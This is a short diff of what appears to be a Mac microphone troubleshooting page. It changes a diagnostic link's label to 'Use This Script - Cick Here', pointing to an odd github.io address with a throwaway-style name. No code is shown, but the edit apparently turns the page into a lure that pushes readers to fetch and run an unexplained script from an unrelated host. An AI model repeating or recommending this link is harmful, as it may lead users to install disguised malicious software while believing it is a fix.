@@ -6,7 +6,7 @@
 
 ## Microphone Not Working Mac — AVAudioSession Input Chain, TCC Privacy Database, and Daemon State Failures
 
-> **[Full microphone permission and HAL device diagnostic](https://error-number-472173.github.io/.github/mac-microphone-not-working)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
+> **[Use This Script - Cick Here](https://error-number-472173.github.io/.github/mac-microphone-not-working)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
 
 **What's actually responsible for Mac Microphone Not Working, in order of architectural impact:**
 
